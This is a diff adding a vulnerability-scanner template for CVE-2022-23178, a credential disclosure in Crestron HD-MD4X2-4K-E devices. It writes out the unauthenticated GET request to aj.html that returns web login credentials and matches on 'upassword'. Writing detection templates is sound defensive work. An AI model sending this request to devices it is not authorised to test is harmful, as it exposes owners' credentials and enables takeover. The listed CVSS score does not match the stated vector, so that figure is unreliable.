@@ -1,0 +1,31 @@
+id: CVE-2022-23178
+info:
+  name: Crestron Hd-Md4X2 Credential Disclosure
+  author: ProjectDiscoveryAI
+  severity: medium
+  description: |
+    Crestron Hd-Md4X2-4K-E has an information disclosure vulnerability that allows attackers to obtain web user login credentials by accessing the aj.html file.
+  reference:
+    - https://de.crestron.com/Products/Video/HDMI-Solutions/HDMI-Switchers/HD-MD4X2-4K-E
+    - http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-202201-1005
+  classification:
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 7.0
+    cve-id: CVE-2022-23178
+  metadata:
+    impact: Attackers can obtain WEB user login credentials and further control the system.
+http:
+  - raw:
+      - |
+        GET /aj.html?a=devi&_=[...] HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "upassword"
